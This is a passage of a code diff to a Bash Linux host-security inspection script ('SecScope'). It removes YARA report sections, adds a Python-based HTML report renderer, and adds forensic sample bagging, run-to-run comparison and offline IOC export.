"${mit:-N/A}" "$raw_ref_html")"
+        row_html="$(printf '<tr class="row-%s finding-row" data-search-item="1" data-section="%s" data-severity="%s" data-confidence="%s" data-search="%s"><td class="col-sev"><span class="tag tag-%s">%s</span></td><td class="col-sum"><span class="life">%s</span> %s</td><td><span class="confidence confidence-%s">%s可信</span></td><td class="col-cat"><span class="cat-label cat-%s">%s</span></td><td class="col-act"><button type="button" class="evidence-toggle" data-target="%s">查看证据</button></td></tr><tr id="%s" class="evidence-row" hidden><td colspan="5"><div class="evidence-layout"><div><div class="dp-label">证据</div><pre>%s</pre><div class="dp-label">判断依据</div><p>%s</p><div class="dp-label">升级条件</div><p>%s</p></div><div><div class="dp-label">处置建议</div><p>%s</p><div class="dp-label">规则 / 指纹</div><code>%s / %s</code><div class="dp-label">首次 / 最近 / 次数</div><code>%s / %s / %s</code><div class="dp-label">模块 / MITRE</div><code>%s / %s</code><div class="dp-label">相关原始数据</div><span class="raw-ref">%s</span></div></div></td></tr>' "$cls" "$section" "$severity_key" "${confidence,,}" "$search_text" "$cls" "$lbl" "$(html_esc "$(lifecycle_label "$lifecycle")")" "$sum_short" "${confidence,,}" "$(html_esc "$(confidence_label "$confidence")")" "$cat" "$clabel" "$evidence_id" "$evidence_id" "$evd" "$(html_esc "$judgment_basis")" "$(html_esc "$escalation_conditions")" "$rec" "$(html_esc "${FINDING_RULE_IDS[$idx]}")" "$(html_esc "${FINDING_FINGERPRINTS[$idx]:0:16}")" "$(html_esc "${FINDING_FIRST_SEEN[$idx]}")" "$(html_esc "${FINDING_LAST_SEEN[$idx]}")" "${FINDING_OCCURRENCES[$idx]}" "$(html_esc "${FINDING_MODULES[$idx]}")" "${mit:-N/A}" "$raw_ref_html")"
 
         case "$lifecycle" in
             ONGOING|BASELINE_EXISTING) ;;
@@ -7860,11 +8818,11 @@ generate_html_report() {
 @media print{body{font-size:10pt}.topbar{background:#fff!important;color:#000;border-bottom:2px solid #000;padding:12px 0}.brand-kicker,.meta{color:#333}.brandmark,.report-nav,.searchbox,.evidence-toggle{display:none!important}.wrap{max-width:none;padding:8px 0}.executive,.overview,.integrity-note,.section{break-inside:avoid}.section{padding:15px 0}.evidence-row[hidden]{display:table-row}.tbl th{position:static}.raw-list{columns:2}.verdict-tag{color:#000;background:#fff!important;border:1px solid #555}.footer{color:#333}}
 /* Static table headers avoid painting empty-result rows above the header. */
 .tbl th{position:static!important;top:auto!important;z-index:auto!important}
-</style></head><body><header class="topbar"><div class="topline"><div class="brandline"><div class="brandmark">SS</div><div><div class="brand-kicker">SECSCOPE / HOST INSPECTION</div><h1>Linux 主机安全巡检报告</h1><div class="meta">OS_PLACEHOLDER · 内核 KERNEL_PLACEHOLDER · 主机角色 HOST_ROLE_PLACEHOLDER · Profile PROFILE_PLACEHOLDER<br>开始时间 TS_PLACEHOLDER（UTC）</div></div></div><div class="verdict-tag CONCLUSION_CLASS">CONCLUSION_TEXT</div></div></header><nav class="report-nav" aria-label="报告导航"><div class="report-nav-inner"><a href="#summary">执行摘要</a><a href="#changes">本轮变化</a><a href="#threats">安全威胁</a><a href="#anomalies">待研判异常</a><a href="#connections">异常外连</a><a href="#yara">YARA</a><a href="#files">文件行为</a><a href="#visibility">检测可见性</a><a href="#evidence">证据索引</a></div></nav><main class="wrap">
+</style></head><body><header class="topbar"><div class="topline"><div class="brandline"><div class="brandmark">SS</div><div><div class="brand-kicker">SECSCOPE / HOST INSPECTION</div><h1>Linux 主机安全巡检报告</h1><div class="meta">OS_PLACEHOLDER · 内核 KERNEL_PLACEHOLDER · 主机角色 HOST_ROLE_PLACEHOLDER · Profile PROFILE_PLACEHOLDER<br>开始时间 TS_PLACEHOLDER（UTC）</div></div></div><div class="verdict-tag CONCLUSION_CLASS">CONCLUSION_TEXT</div></div></header><nav class="report-nav" aria-label="报告导航"><div class="report-nav-inner"><a href="#summary">执行摘要</a><a href="#changes">本轮变化</a><a href="#threats">安全威胁</a><a href="#anomalies">待研判异常</a><a href="#connections">异常外连</a><a href="#files">文件行为</a><a href="#visibility">检测可见性</a><a href="#evidence">证据索引</a></div></nav><main class="wrap">
 <section id="summary" class="executive" aria-label="执行摘要"><div class="executive-lead"><span class="executive-label">本轮结论</span><strong class="executive-value">CONCLUSION_TEXT</strong><span class="executive-note">结论仅依据本轮已采集证据；可见性缺口与未安装数据源单独列示。</span></div><div class="executive-metric"><span class="executive-label">安全威胁</span><strong class="executive-value">THREAT_TOTAL_VALUE</strong><span class="executive-note">严重 THREAT_CRITICAL_VALUE · 高危 THREAT_HIGH_VALUE</span></div><div class="executive-metric"><span class="executive-label">本轮变化</span><strong class="executive-value">CHANGE_TOTAL_VALUE</strong><span class="executive-note">新增、变化、再次出现或恢复</span></div><div class="executive-metric"><span class="executive-label">检查覆盖</span><strong class="executive-value">COVERAGE_PLACEHOLDER%</strong><span class="executive-note">MODULE_COUNT_VALUE 个模块已记录状态</span></div></section>
 <div class="overview"><div class="overview-card"><span>主机</span><b>HOSTNAME_PLACEHOLDER</b></div><div class="overview-card"><span>本机 IP</span><b>LOCAL_IPS_PLACEHOLDER</b></div><div class="overview-card"><span>检查覆盖率</span><b>COVERAGE_PLACEHOLDER%</b></div><div class="overview-card"><span>状态库 / 认证画像</span><b>STATE_PLACEHOLDER / AUTH_PROFILE_PLACEHOLDER</b></div></div>
 <div class="integrity-note"><strong>证据完整性提示：</strong>HTML 只是展示层，不能替代原始证据。移动或分享时必须保留同目录的 <code>raw/</code>、<code>findings.json</code>、<code>raw-manifest.json</code>、<code>report-manifest.json</code> 和 <code>report.sha256</code>；在报告目录执行 <code>bash verify-report.sh</code> 可检查缺失或篡改。</div>
-<section class="searchbox"><input id="report-search" type="search" autocomplete="off" placeholder="搜索端口、IP、进程、规则编号或哈希"><select id="report-severity"><option value="">全部级别</option><option value="critical">严重</option><option value="high">高危</option><option value="medium">中危</option><option value="low">低危</option><option value="observe">观察</option></select><select id="report-confidence"><option value="">全部可信度</option><option value="high">高可信</option><option value="medium">中可信</option><option value="low">低可信</option></select><select id="report-section"><option value="">全部模块</option><option value="changes">本轮变化</option><option value="threat">安全威胁</option><option value="anomaly">待研判异常</option><option value="yara">YARA 命中</option><option value="rat">RAT / Loader</option><option value="baseline">配置基线</option><option value="trust">软件信任缺口</option><option value="observation">运行观察</option><option value="files">文件行为</option><option value="endpoint">终端安全</option><option value="priority">处理建议</option><option value="modules">模块覆盖</option><option value="ioc">IOC</option><option value="raw">原始证据</option></select><button id="report-search-clear" type="button">重置</button><span id="report-search-result" class="search-result"></span></section>
+<section class="searchbox"><input id="report-search" type="search" autocomplete="off" placeholder="搜索端口、IP、进程、规则编号或哈希"><select id="report-severity"><option value="">全部级别</option><option value="critical">严重</option><option value="high">高危</option><option value="medium">中危</option><option value="low">低危</option><option value="observe">观察</option></select><select id="report-confidence"><option value="">全部可信度</option><option value="high">高可信</option><option value="medium">中可信</option><option value="low">低可信</option></select><select id="report-section"><option value="">全部模块</option><option value="changes">本轮变化</option><option value="threat">安全威胁</option><option value="anomaly">待研判异常</option><option value="rat">RAT / Loader</option><option value="baseline">配置基线</option><option value="trust">软件信任缺口</option><option value="observation">运行观察</option><option value="files">文件行为</option><option value="endpoint">终端安全</option><option value="priority">处理建议</option><option value="modules">模块覆盖</option><option value="ioc">IOC</option><option value="raw">原始证据</option></select><button id="report-search-clear" type="button">重置</button><span id="report-search-result" class="search-result"></span></section>
 <section class="section"><div class="section-hd"><h2>防病毒 / 终端安全软件</h2></div><p class="hint">根据本机程序、systemd 服务和可用病毒库识别；异常状态进入建议优先处理，不计入高危威胁数。</p><div class="table-wrap"><table class="tbl"><thead><tr><th>产品</th><th>运行状态</th><th>病毒库或能力状态</th><th>识别来源</th></tr></thead><tbody>ENDPOINT_TABLE</tbody></table></div></section>
 <section class="section"><div class="section-hd"><h2>建议优先处理</h2></div><p class="hint">运维和待研判建议，不计入严重或高危威胁数量。</p><div class="table-wrap"><table class="tbl"><thead><tr><th>项目</th><th>当前状态</th><th>建议</th></tr></thead><tbody>PRIORITY_TABLE</tbody></table></div></section>
 <section id="changes" class="section"><div class="section-hd"><h2>本轮变化</h2></div>CHANGE_STATS<p class="hint">仅展示优先级最高的 10 项，完整内容请查看威胁指标和配置基线。</p><div class="table-wrap">CHANGE_TABLE</div></section>
@@ -7874,7 +8832,6 @@ generate_html_report() {
 <section class="section"><div class="section-hd"><h2>软件信任缺口</h2></div><p class="hint">缺少包归属、签名或受支持状态需要核验，但不能单凭未知状态判定恶意。</p><div class="table-wrap">TRUST_TABLE</div></section>
 <section class="section"><div class="section-hd"><h2>运行 / 性能观察</h2></div><div class="table-wrap">OBSERVATION_TABLE</div></section>
 <section id="connections" class="section"><div class="section-hd"><h2>异常外连</h2></div><p class="hint">连接组合基线：exe_sha256 + exe_path + user + dst_ip + dst_port；新增组合仅作为本地历史候选，不进行外部情报查询。</p><div class="table-wrap">ABNORMAL_CONNECTION_TABLE</div></section>
-<section id="yara" class="section"><div class="section-hd"><h2>YARA 命中</h2></div><p class="hint">规则 meta 决定严重度和可信度；命中结果已关联文件变化、Web 请求、运行进程、网络、持久化及容器上下文。</p><div class="table-wrap">YARA_TABLE</div></section>
 <section id="files" class="section"><div class="section-hd"><h2>可疑文件行为</h2></div><p class="hint">新增、修改、移动和删除文件均保留动作、大小、MD5、SHA-256、关联进程、关联网络连接和触发原因。</p><div class="table-wrap">FILE_TABLE</div></section>
 <section class="section"><details class="section-fold"><summary>组件版本与离线支持状态</summary><div class="table-wrap">COMPONENT_TABLE</div></details></section>
 <section id="visibility" class="section"><div class="section-hd"><h2>检测可见性</h2></div><p>VISIBILITY_TEXT</p><div class="table-wrap">VISIBILITY_TABLE</div></section>
@@ -7926,29 +8883,14 @@ HTM
     done
     [ -n "$file_rows" ] || file_rows='<tr><td colspan="5"><div class="empty-state">本轮无文件行为变化，或首轮仅建立基线</div></td></tr>'
     local file_table_html="<table class=\"tbl\"><thead><tr><th>级别</th><th>文件 / 动作</th><th>可信度</th><th>MD5 / SHA-256</th><th>关联进程 / 网络</th><th>触发原因</th></tr></thead><tbody>${file_rows}</tbody></table>"
-    local yara_rows="" yara_target yara_rule yara_namespace yara_severity yara_confidence yara_category yara_family yara_mitre yara_description yara_tags yara_metadata yara_sha yara_md5 yara_package yara_action yara_priority_score yara_priority_reasons yara_web_root yara_web_access yara_process yara_network yara_persistence yara_container yara_kubernetes yara_domains yara_requested_type yara_reason yara_context
-    if [ -r "${RAW_DIR}/yara-findings.tsv" ]; then
-        while IFS=$'\037' read -r yara_target yara_rule yara_namespace yara_severity yara_confidence yara_category yara_family yara_mitre yara_description yara_tags yara_metadata yara_sha yara_md5 yara_package yara_action yara_priority_score yara_priority_reasons yara_web_root yara_web_access yara_process yara_network yara_persistence yara_container yara_kubernetes yara_domains yara_requested_type yara_reason; do
-            [ "$yara_target" = target ] && continue
-            [ -n "$yara_target$yara_rule" ] || continue
-            yara_context="web=${yara_web_access:-none}; process=${yara_process:-none}; network=${yara_network:-none}; persistence=${yara_persistence:-none}; container=${yara_container:-none}; kubernetes=${yara_kubernetes:-none}"
-            yara_rows+="$(printf '<tr data-search-item="1" data-section="yara" data-severity="%s" data-confidence="%s"><td><span class="tag tag-severity-%s">%s</span><br><span class="confidence confidence-%s">%s</span></td><td><code>%s:%s</code><br><small>category=%s · family=%s · MITRE=%s<br>%s</small></td><td><code>%s</code><br><small>package=%s · web_root=%s</small></td><td><code>%s</code><br><code>%s</code></td><td>%s<br><small>priority=%s (%s)</small></td><td><small>%s</small></td></tr>' \
-                "$(printf '%s' "$yara_severity" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "$yara_confidence" | tr '[:upper:]' '[:lower:]')" "$(printf '%s' "$yara_severity" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$yara_severity")" "$(printf '%s' "$yara_confidence" | tr '[:upper:]' '[:lower:]')" "$(html_esc "$yara_confidence")" \
-                "$(html_esc "$yara_namespace")" "$(html_esc "$yara_rule")" "$(html_esc "$yara_category")" "$(html_esc "$yara_family")" "$(html_esc "$yara_mitre")" "$(html_esc "$yara_description")" \
-                "$(html_esc "$(redact_text "$yara_target")")" "$(html_esc "$yara_package")" "$(html_esc "$(redact_text "$yara_web_root")")" "$(html_esc "$yara_md5")" "$(html_esc "$yara_sha")" \
-                "$(html_esc "$yara_action")" "$(html_esc "$yara_priority_score")" "$(html_esc "$yara_priority_reasons")" "$(html_esc "$(redact_text "$yara_context")")")"
-        done < <(tr '\t' '\037' < "${RAW_DIR}/yara-findings.tsv")
-    fi
-    [ -n "$yara_rows" ] || yara_rows='<tr><td colspan="6"><div class="empty-state">本轮无 YARA 命中，或该模式未启用 YARA</div></td></tr>'
-    local yara_table_html="<table class=\"tbl\"><thead><tr><th>级别 / 可信度</th><th>规则 / meta</th><th>目标文件</th><th>MD5 / SHA-256</th><th>文件变化</th><th>关联上下文</th></tr></thead><tbody>${yara_rows}</tbody></table>"
     local component_rows="" component_idx
     for component_idx in "${!COMPONENT_NAMES[@]}"; do
         component_rows+="$(printf '<tr><td>%s</td><td>%s</td><td>%s</td><td>%s</td></tr>' "$(html_esc "${COMPONENT_NAMES[$component_idx]}")" "$(html_esc "${COMPONENT_VERSIONS[$component_idx]}")" "$(html_esc "${COMPONENT_SOURCES[$component_idx]}")" "$(html_esc "${COMPONENT_SUPPORT[$component_idx]}")")"
     done
     [ -n "$component_rows" ] || component_rows='<tr><td colspan="4"><div class="empty-state">未采集到组件版本</div></td></tr>'
     local component_table_html="<table class=\"tbl\"><thead><tr><th>组件</th><th>版本</th><th>来源</th><th>支持状态</th></tr></thead><tbody>${component_rows}</tbody></table>"
-    local visibility_text="模块覆盖率 ${RUN_COVERAGE}%；事件窗口 ${EVENT_WINDOW_MINUTES} 分钟，归一化 ${EVENT_COUNT} 条（Falco ${EVENT_FALCO_COUNT} / audit ${EVENT_AUDIT_COUNT}）；YARA 模式 ${YARA_MODE}，扫描 ${YARA_SCANNED} 个文件、命中 ${YARA_MATCHED} 条、超时 ${YARA_TIMEOUT_COUNT}、错误 ${YARA_ERROR_COUNT}、提升 ${YARA_PROMOTED_FINDINGS} 条；Web 日志采样 ${WEB_ACCESS_LOG_LINES} 条，完整解析 ${WEB_ACCESS_LOG_PARSED} 条、部分解析 ${WEB_ACCESS_LOG_FAILED} 条；容器上下文 ${CONTAINER_CONTEXT_STATUS}（${CONTAINER_CONTEXT_COUNT} 个进程），Kubernetes 上下文 ${KUBERNETES_CONTEXT_STATUS}（${KUBERNETES_CONTEXT_COUNT} 条）；文件监控 ${FILE_SCAN_STATUS}，扫描 ${FILE_SCAN_SCANNED} 个文件，其中小文件优先 ${FILE_SCAN_SMALL_PRIORITY} 个、新增小文件 ${FILE_SCAN_ADDED_SMALL} 个、复用哈希 ${FILE_SCAN_HASH_REUSED} 个、新计算哈希 ${FILE_SCAN_HASH_SUCCESS} 个、失败 ${FILE_SCAN_HASH_FAILED} 个；最近补丁状态 ${PATCH_STATUS}${PATCH_LATEST:+，最近记录 ${PATCH_LATEST}}。缺失数据源只表示可见性缺口，不代表安全。"
-    local visibility_table_html="<table class=\"tbl\"><thead><tr><th>数据源</th><th>状态</th><th>说明</th></tr></thead><tbody>$(printf '<tr><td>snapshot</td><td>%s</td><td>/proc、ss、文件基线与本机日志</td></tr><tr><td>auditd</td><td>%s</td><td>execve/connect/open-write/rename-unlink/chmod/ptrace/setns 等</td></tr><tr><td>Falco</td><td>%s</td><td>优先读取既有 JSON 日志，不自动安装或改规则</td></tr><tr><td>YARA</td><td>%s</td><td>仅在命令和组织规则文件均可用时扫描</td></tr><tr><td>IMA</td><td>%s</td><td>只读检查 runtime measurements 可见性</td></tr><tr><td>Web access</td><td>%s</td><td>Nginx/Apache/OpenResty/Caddy/Tomcat/JSON；解析 %s，部分 %s</td></tr><tr><td>Container</td><td>%s</td><td>cgroup、runtime/container/pod ID 与 namespace inode</td></tr><tr><td>Kubernetes</td><td>%s</td><td>运行时 Socket、ServiceAccount、宿主路径与特权上下文</td></tr><tr><td>RAT engine</td><td>%s</td><td>PE/ELF + 稳定进程实体 + 网络/内存/持久化图</td></tr><tr><td>Threat intel</td><td>%s</td><td>永久离线：仅本地 IOC/白名单/历史基线；不存在 HTTP 或 DNS 查询能力</td></tr>' "$EVENT_SOURCE_SNAPSHOT" "$EVENT_SOURCE_AUDITD" "$EVENT_SOURCE_FALCO" "$EVENT_SOURCE_YARA" "$EVENT_SOURCE_IMA" "$WEB_ACCESS_LOG_STATUS" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$CONTAINER_CONTEXT_STATUS" "$KUBERNETES_CONTEXT_STATUS" "$RAT_STATUS" "$THREAT_INTEL_STATUS")</tbody></table>"
+    local visibility_text="模块覆盖率 ${RUN_COVERAGE}%；事件窗口 ${EVENT_WINDOW_MINUTES} 分钟，归一化 ${EVENT_COUNT} 条（Falco ${EVENT_FALCO_COUNT} / audit ${EVENT_AUDIT_COUNT}）；Web 日志采样 ${WEB_ACCESS_LOG_LINES} 条，完整解析 ${WEB_ACCESS_LOG_PARSED} 条、部分解析 ${WEB_ACCESS_LOG_FAILED} 条；容器上下文 ${CONTAINER_CONTEXT_STATUS}（${CONTAINER_CONTEXT_COUNT} 个进程），Kubernetes 上下文 ${KUBERNETES_CONTEXT_STATUS}（${KUBERNETES_CONTEXT_COUNT} 条）；文件监控 ${FILE_SCAN_STATUS}，扫描 ${FILE_SCAN_SCANNED} 个文件，其中小文件优先 ${FILE_SCAN_SMALL_PRIORITY} 个、新增小文件 ${FILE_SCAN_ADDED_SMALL} 个、复用哈希 ${FILE_SCAN_HASH_REUSED} 个、新计算哈希 ${FILE_SCAN_HASH_SUCCESS} 个、失败 ${FILE_SCAN_HASH_FAILED} 个；最近补丁状态 ${PATCH_STATUS}${PATCH_LATEST:+，最近记录 ${PATCH_LATEST}}。缺失数据源只表示可见性缺口，不代表安全。"
+    local visibility_table_html="<table class=\"tbl\"><thead><tr><th>数据源</th><th>状态</th><th>说明</th></tr></thead><tbody>$(printf '<tr><td>snapshot</td><td>%s</td><td>/proc、ss、文件基线与本机日志</td></tr><tr><td>auditd</td><td>%s</td><td>execve/connect/open-write/rename-unlink/chmod/ptrace/setns 等</td></tr><tr><td>Falco</td><td>%s</td><td>优先读取既有 JSON 日志，不自动安装或改规则</td></tr><tr><td>IMA</td><td>%s</td><td>只读检查 runtime measurements 可见性</td></tr><tr><td>Web access</td><td>%s</td><td>Nginx/Apache/OpenResty/Caddy/Tomcat/JSON；解析 %s，部分 %s</td></tr><tr><td>Container</td><td>%s</td><td>cgroup、runtime/container/pod ID 与 namespace inode</td></tr><tr><td>Kubernetes</td><td>%s</td><td>运行时 Socket、ServiceAccount、宿主路径与特权上下文</td></tr><tr><td>RAT engine</td><td>%s</td><td>PE/ELF + 稳定进程实体 + 网络/内存/持久化图</td></tr><tr><td>Threat intel</td><td>%s</td><td>永久离线：仅本地 IOC/白名单/历史基线；不存在 HTTP 或 DNS 查询能力</td></tr>' "$EVENT_SOURCE_SNAPSHOT" "$EVENT_SOURCE_AUDITD" "$EVENT_SOURCE_FALCO" "$EVENT_SOURCE_IMA" "$WEB_ACCESS_LOG_STATUS" "$WEB_ACCESS_LOG_PARSED" "$WEB_ACCESS_LOG_FAILED" "$CONTAINER_CONTEXT_STATUS" "$KUBERNETES_CONTEXT_STATUS" "$RAT_STATUS" "$THREAT_INTEL_STATUS")</tbody></table>"
     [ -z "$change_rows" ] && change_rows='<tr><td colspan="3"><div class="empty-state">本轮无新增、升级、变化、重开或恢复项</div></td></tr>'
     local change_table_html="<table class=\"tbl\"><thead><tr><th>状态</th><th>发现</th><th>级别</th></tr></thead><tbody>${change_rows}</tbody></table>"
 
@@ -7989,7 +8931,6 @@ HTM
         "TRUST_TABLE" "$trust_table_html" \
         "OBSERVATION_TABLE" "$observation_table_html" \
         "FILE_TABLE" "$file_table_html" \
-        "YARA_TABLE" "$yara_table_html" \
         "ABNORMAL_CONNECTION_TABLE" "$abnormal_table_html" \
         "COMPONENT_TABLE" "$component_table_html" \
         "VISIBILITY_TEXT" "$(html_esc "$visibility_text")" \
@@ -8017,7 +8958,7 @@ HTM
 generate_report_legacy() {
     local legacy_verdict
     legacy_verdict=$(verdict_text)
-    generate_html_report "$legacy_verdict" || return 1
+    generate_html_report_legacy "$legacy_verdict" || return 1
     chmod 600 "$HTML_FILE" || return 1
     log_info "HTML 报告已保存至: ${HTML_FILE}"
 }
@@ -8025,13 +8966,10 @@ scan_visibility_incomplete() {
     local status_file_status
     case "$STATIC_CANDIDATE_STATUS" in PARTIAL|UNAVAILABLE) return 0 ;; esac
     for status_file_status in "${MODULE_STATUSES[@]}"; do
-        case "$status_file_status" in PARTIAL|FAILED) return 0 ;; esac
+        # v2.3（审计 R3）：预算耗尽跳过的模块同样是覆盖缺口，verdict 不得
+        # 输出"未发现明显威胁指标"。
+        case "$status_file_status" in PARTIAL|FAILED|SKIPPED_BUDGET) return 0 ;; esac
     done
-    if [ "$PROFILE_YARA_ENABLED" = true ]; then
-        [ "$EVENT_SOURCE_YARA" = AVAILABLE ] || return 0
-        [ "${YARA_RULES_LOADED:-0}" -gt 0 ] || return 0
-        [ "${YARA_ERROR_COUNT:-0}" -eq 0 ] && [ "${YARA_TIMEOUT_COUNT:-0}" -eq 0 ] || return 0
-    fi
     if [ -r "${RAW_DIR}/static-coverage.jsonl" ] && command -v python3 >/dev/null 2>&1; then
         python3 - "${RAW_DIR}/static-coverage.jsonl" <<'PY' >/dev/null 2>&1 || return 0
 import json, sys
@@ -8259,15 +9197,96 @@ finalize_evidence() {
     [ "$CREATE_ARCHIVE" = false ] || create_report_archive || return 1
 }
 
+# v2 报告渲染：findings.json/status.json 先落盘，再由 report_gen.py 渲染单文件
+# HTML（零外部资源、置信度分级呈现、SVG 图表）。python3/渲染器缺失时回退
+# legacy bash 模板（需 perl）。彻底移除 v1.1 对 perl 的硬依赖。
+generate_html_report() {
+    local verdict="$1"
+    if command -v python3 >/dev/null 2>&1 && [ -r "$REPORT_GEN_PATH" ]; then
+        local meta_file="${OUTPUT_DIR}/.report-meta.${RUN_ID}"
+        {
+            printf 'verdict=%s\n' "$verdict"
+            printf 'hostname=%s\n' "$HOSTNAME"
+            printf 'profile=%s\n' "$SCAN_PROFILE"
+            printf 'run_id=%s\n' "$RUN_ID"
+            printf 'host_role=%s\n' "$HOST_ROLE"
+            printf 'os=%s\n' "${OS_NAME:-Linux}"
+            printf 'started=%s\n' "$RUN_STARTED_AT"
+            printf 'finished=%s\n' "${RUN_FINISHED_AT:-}"
+            printf 'duration=%ss\n' "$((SECONDS))"
+            printf 'coverage=%s\n' "$RUN_COVERAGE"
+            printf 'budget_used=%s\n' "$SECONDS"
+            printf 'budget_limit=%s\n' "$SCAN_DEADLINE_SECONDS"
+            printf 'pack=detect-pack v2（%s 条行为/结构签名）\n' "$DETECT_RULE_COUNT"
+            printf 'engine=%s\n' "${DETECT_ENGINE_NOTE:-统一检测引擎 v2 + 多源关联门禁}"
+        } > "$meta_file" 2>/dev/null || meta_file=""
+        if python3 "$REPORT_GEN_PATH" --findings "${OUTPUT_DIR}/findings.json" \
+            --status "${OUTPUT_DIR}/status.json" ${meta_file:+--meta "$meta_file"} \
+            ${COMPARE_DATA_FILE:+--compare-data "$COMPARE_DATA_FILE"} \
+            --output "$HTML_FILE" >>"${RAW_DIR:-.}/module-report.log" 2>&1; then
+            [ -s "$HTML_FILE" ] || return 1
+            return 0
+        fi
+        log_warn 'v2 渲染器失败，回退 legacy bash 模板'
+    fi
+    generate_html_report_legacy "$verdict"
+}
+
 generate_report() {
     local verdict total raw_count
     verdict=$(verdict_text)
     total=$((SEVERITY_CRITICAL + SEVERITY_HIGH + SEVERITY_MEDIUM + SEVERITY_LOW))
     RUN_FINISHED_AT=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 
-    if ! command -v perl >/dev/null 2>&1; then
-        log_error 'HTML 报告生成依赖 perl 不可用'
-        return 1
+    # v2 编排：先落盘结构化数据，渲染器直接消费；主流程稍后跳过重复序列化。
+    write_findings_json || log_warn 'findings.json 写入失败'
+    write_status_json "$verdict" || log_warn 'status.json 写入失败'
+    REPORT_DATA_WRITTEN=true
+    # v2.3 F5：轮次对比——按 finding 指纹与上一轮输出目录差集，
+    # --no-state 的一次性取证同样可用（不依赖 state）。
+    if [ -n "$COMPARE_DIR" ] && [ -r "${COMPARE_DIR%/}/findings.json" ]; then
+        local compare_summary
+        compare_summary=$(run_with_timeout 30 python3 "$REPORT_COMPARE_PATH" \
+            --current "${OUTPUT_DIR}/findings.json" \
+            --previous "${COMPARE_DIR%/}/findings.json" \
+            --out-json "${OUTPUT_DIR}/compare.json" \
+            --out-tsv "${RAW_DIR}/findings-compare.tsv" 2>>"${RAW_DIR}/module-report.log") || compare_summary=""
+        if printf '%s' "$compare_summary" | grep -qE '"status":\s*"SUCCESS"'; then
+            COMPARE_DATA_FILE="${OUTPUT_DIR}/compare.json"
+            record_raw_status 'findings-compare.tsv' SUCCESS report "compare_vs_$(basename "$COMPARE_DIR")"
+        else
+            record_raw_status 'findings-compare.tsv' PARTIAL report 'compare_failed'
+        fi
+    fi
+
+    # F1 取证样本袋：把引擎判定为恶意/高危的文件打包成只读证据档案
+    # （只复制不移动；预算 500 文件/200MB；无命中则跳过）。
+    if command -v python3 >/dev/null 2>&1 && [ -r "$SAMPLE_BAG_PATH" ]; then
+        local bag_summary
+        bag_summary=$(run_with_timeout 120 python3 "$SAMPLE_BAG_PATH" \
+            --static-projection "${RAW_DIR}/static-analysis-projection.tsv" \
+            --binary-projection "${RAW_DIR}/binary-analysis-projection.tsv" \
+            --findings "${OUTPUT_DIR}/findings.json" \
+            --out "${OUTPUT_DIR}/samples-bag.tar.gz" \
+            --manifest-out "${OUTPUT_DIR}/SAMPLES-MANIFEST.csv" 2>>"${RAW_DIR}/module-report.log") || bag_summary=""
+        if printf '%s' "$bag_summary" | grep -qE '"status":\s*"SUCCESS"'; then
+            record_raw_status 'samples-bag.tar.gz' "$([ "$(python3 -c 'import json,sys; print(1 if json.loads(sys.argv[1]).get("bagged",0) else 0' "$bag_summary" 2>/dev/null)" = "1" ] && printf SUCCESS || printf NO_RESULTS)" report "sample_bag"
+            log_info "F1 样本袋: $(printf '%s' "$bag_summary" | python3 -c 'import json,sys; d=json.loads(sys.stdin.read()); print("打包 %d 个样本 / %d bytes（跳过超大 %d，超预算 %d）" % (d.get("bagged",0), d.get("total_bytes",0), d.get("skipped_oversize",0), d.get("skipped_budget",0)))' 2>/dev/null)"
+        else
+            record_raw_status 'samples-bag.tar.gz' PARTIAL report 'sample_bag_failed'
+        fi
+    fi
+    # F2 IOC 导出包：TSV/CSV/STIX 2.1 三格式，供 SOC 平台直接消费。
+    if command -v python3 >/dev/null 2>&1 && [ -r "$IOC_EXPORT_PATH" ]; then
+        local ioc_summary
+        ioc_summary=$(run_with_timeout 30 python3 "$IOC_EXPORT_PATH" \
+            --findings "${OUTPUT_DIR}/findings.json" \
+            --status "${OUTPUT_DIR}/status.json" \
+            --out-dir "${OUTPUT_DIR}/ioc-export" \
+            --run-id "$RUN_ID" 2>>"${RAW_DIR}/module-report.log") || ioc_summary=""
+        if printf '%s' "$ioc_summary" | grep -qE '"status":\s*"SUCCESS"'; then
+            record_raw_status 'ioc-export' "$([ "$(printf '%s' "$ioc_summary" | python3 -c 'import json,sys; print(1 if json.loads(sys.stdin.read()).get("indicators",0) else 0' 2>/dev/null)" = "1" ] && printf SUCCESS || printf NO_RESULTS)" report 'ioc_export'
+        fi
     fi
     if ! generate_html_report "$verdict"; then
         log_error "HTML 报告生成失败: $HTML_FILE"
@@ -8285,13 +9304,19 @@ generate_report() {
 
 write_findings_json() {
     local file="${OUTPUT_DIR}/findings.json" pending="${OUTPUT_DIR}/.findings.json.pending.${BASHPID:-$$}" idx file_context
+    # 证据脱敏一次性批量完成，替代循环内每条一次 perl 的 fork。
+    local -a REDACTED_EV=()
+    if [ "${#FINDINGS[@]}" -gt 0 ]; then
+        local red_rec
+        while IFS= read -r -d $'\0' red_rec; do REDACTED_EV+=("$red_rec"); done < <(printf '%s\0' "${FINDING_EVIDENCES[@]}" | redact_batch_stream)
+    fi
     {
         printf '{\n  "schema_version": 3, "report_version": %s, "platform":"linux", "profile":%s, "run_id": %s, "findings": [\n' "$(json_quote "$SCRIPT_VERSION")" "$(json_quote "$SCAN_PROFILE")" "$(json_quote "$RUN_ID")"
         for idx in "${!FINDINGS[@]}"; do
             [ "$idx" -gt 0 ] && printf ',\n'
             printf '    {"id":%s,"severity":%s,"finding_type":%s,"confidence":%s,"category":%s,"summary":%s,"evidence":%s,"recommendation":%s,"judgment_basis":%s,"escalation_conditions":%s,"evidence_domains":%s,"evidence_domain_count":%s,"counter_evidence":%s,"attack_timeline":%s,"rule_id":%s,"entity":%s,"entity_type":%s,"fingerprint":%s,"evidence_hash":%s,"module":%s,"mitre":%s,"lifecycle":%s,"first_seen":%s,"last_seen":%s,"occurrences":%s,"detector":"secscope-native","detector_version":%s,"event_ids":[],"entity_id":%s,"process_instance_id":%s,"evidence_sources":%s,"visibility_gaps":[],"deobfuscation_chain":[],"language":"","runtime":"","baseline_comparison":"","causal_edges":[],"raw_references":[' \
                 "$(json_quote "${FINDINGS[$idx]}")" "$(json_quote "${FINDING_SEVS[$idx]}")" "$(json_quote "${FINDING_TYPES[$idx]}")" "$(json_quote "${FINDING_CONFIDENCES[$idx]}")" \
-                "$(json_quote "${FINDING_CATS[$idx]}")" "$(json_quote "${FINDING_SUMMARIES[$idx]}")" "$(json_quote "$(redact_text "${FINDING_EVIDENCES[$idx]}")")" \
